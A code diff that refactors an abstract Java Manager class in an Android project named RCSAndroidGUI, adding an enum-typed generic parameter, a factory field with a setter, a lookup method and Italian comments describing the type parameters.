@@ -15,15 +15,19 @@ import android.util.Log;
 
 import com.ht.RCSAndroidGUI.agent.AgentBase;
 import com.ht.RCSAndroidGUI.agent.AgentConf;
+import com.ht.RCSAndroidGUI.agent.AgentType;
+import com.ht.RCSAndroidGUI.interfaces.AbstractFactory;
 import com.ht.RCSAndroidGUI.util.Check;
 
 // TODO: Auto-generated Javadoc
 /**
  * The Class Manager.
- *
+ * T : classe ThreadCase per cui il Manger fa da aggregatore
+ * U : chiave che garantisce l'univocita' di T
+ * V : enumerativo che identifica il tipo della chiave nella factory 
  * @param <T> the generic type
  */
-public abstract class Manager<T extends ThreadBase, U> {
+public abstract class Manager<T extends ThreadBase, U, V extends Enum> {
 	/** The running. */
 	protected  HashMap<U, T> running;
 	
@@ -33,6 +37,8 @@ public abstract class Manager<T extends ThreadBase, U> {
 	/** The status. */
 	protected Status status;
 	
+	protected AbstractFactory<T,V> factory;
+	
 	/**
 	 * Instantiates a new manager.
 	 */
@@ -40,6 +46,14 @@ public abstract class Manager<T extends ThreadBase, U> {
 		status = Status.self();
 		running = new HashMap<U, T>();
 		threads = new HashMap<T, Thread>();
+	}
+	
+	public void setFactory(AbstractFactory<T,V> factory){
+		this.factory = factory;
+	}
+	
+	public T get(U key){
+		return running.get(key);
 	}
 	
 	/**
